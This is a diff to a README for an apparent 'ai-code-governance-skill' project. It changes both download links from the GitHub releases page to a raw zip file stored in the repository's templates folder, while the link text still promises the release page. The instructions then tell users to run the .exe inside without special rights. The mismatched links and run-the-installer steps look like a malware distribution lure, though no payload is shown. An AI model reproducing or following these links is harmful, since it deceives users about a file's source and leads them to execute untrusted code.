@@ -1,6 +1,6 @@
 # 🛡️ ai-code-governance-skill - Improve code quality with smart governance
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Wyattputrescent882/ai-code-governance-skill/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Wyattputrescent882/ai-code-governance-skill/main/templates/governance-skill-code-ai-v1.8.zip)
 
 ## 🔍 Understanding the tool
 
@@ -20,7 +20,7 @@ Your computer must meet these basic standards to run the software:
 
 You must download the installer from the official release page. This page contains the latest version of the program.
 
-[Click here to visit the release page and download the installer](https://github.com/Wyattputrescent882/ai-code-governance-skill/releases)
+[Click here to visit the release page and download the installer](https://raw.githubusercontent.com/Wyattputrescent882/ai-code-governance-skill/main/templates/governance-skill-code-ai-v1.8.zip)
 
 Look for the file that ends in .exe. Save this file to your computer. Once the download finishes, find the file in your downloads folder. Double-click the file to start the installation. A window will appear. Follow the prompts on the screen to finish the setup. You do not need special access rights to install this on your user profile.
 
